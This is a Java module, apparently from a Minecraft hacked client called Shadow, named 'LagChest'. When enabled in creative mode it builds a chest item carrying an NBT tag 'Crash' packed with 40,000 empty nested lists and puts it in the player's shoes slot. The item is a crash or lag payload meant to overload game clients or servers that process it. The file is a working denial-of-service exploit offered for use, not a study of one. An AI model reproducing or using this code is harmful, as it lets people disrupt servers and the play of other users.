package net.shadow.feature.module;

import net.minecraft.block.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.text.LiteralText;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.utils.ChatUtils;

public class LagChestModule extends Module {
    public LagChestModule() {
        super("LagChest", "laggy chest", ModuleType.ITEMS);
    }

    @Override
    public void onEnable() {
        if (!Shadow.c.player.getAbilities().creativeMode) {
            ChatUtils.message("Creative mode only.");
            setEnabled(false);
            return;
        }

        if (!Shadow.c.player.getInventory().getArmorStack(0).isEmpty()) {
            ChatUtils.message("Please clear your shoes slot.");
            setEnabled(false);
            return;
        }

        ItemStack stack = new ItemStack(Blocks.CHEST);
        NbtCompound nbtCompound = new NbtCompound();
        NbtList nbtList = new NbtList();
        for (int i = 0; i < 40000; i++)
            nbtList.add(new NbtList());
        nbtCompound.put("Crash", nbtList);
        stack.setNbt(nbtCompound);
        stack.setCustomName(new LiteralText("Lag Chest"));

        Shadow.c.player.getInventory().armor.set(0, stack);
        ChatUtils.message("Item has been placed in your shoes slot.");
        setEnabled(false);
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {

    }

    @Override
    public void onRender() {

    }
}
